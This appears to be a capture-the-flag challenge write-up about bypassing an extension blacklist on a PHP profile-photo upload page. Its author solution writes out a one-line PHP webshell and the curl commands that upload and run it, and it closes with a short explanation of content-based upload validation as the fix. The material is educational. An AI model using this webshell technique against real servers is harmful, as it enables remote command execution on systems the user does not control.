# Upload-to-RCE — PicProfile

A profile-photo upload page with a four-entry extension blacklist
(`.php`, `.php5`, `.php7`, `.pht`). Files land under `/uploads/`,
served directly by Apache. The container's Apache config also
hands `.phtml` and `.phar` to the PHP interpreter — the blacklist
never heard of those.

## Player target

Upload a webshell, execute it, read `/flag.txt`.

## Author solution

```bash
cat > shell.phtml <<'PHP'
<?php system($_GET['c']); ?>
PHP

curl -s -F 'photo=@shell.phtml' http://target/
# -> "Uploaded. Available at /uploads/shell.phtml"

curl -s 'http://target/uploads/shell.phtml?c=cat+/flag.txt'
# -> CTF{REDACTED}
```

## Why this is the lesson

* **Blacklists are open sets.** PHP-handled extensions vary by
  distro and config (`.phtml`, `.phar`, `.php3`, `.php4`, `.pht`,
  `.shtml` with SSI, …) and the upload handler doesn't know what
  the web server thinks.
* **The fix is content-based.** Don't trust the filename. Validate
  the upload by reading bytes (PIL / ImageMagick for images;
  reject anything that doesn't decode as a real image), generate
  the stored filename yourself, and serve from a path the web
  server **does not interpret as code** (e.g. a CDN, an
  S3-equivalent, or a static-only document root with `php_admin_flag
  engine off`).
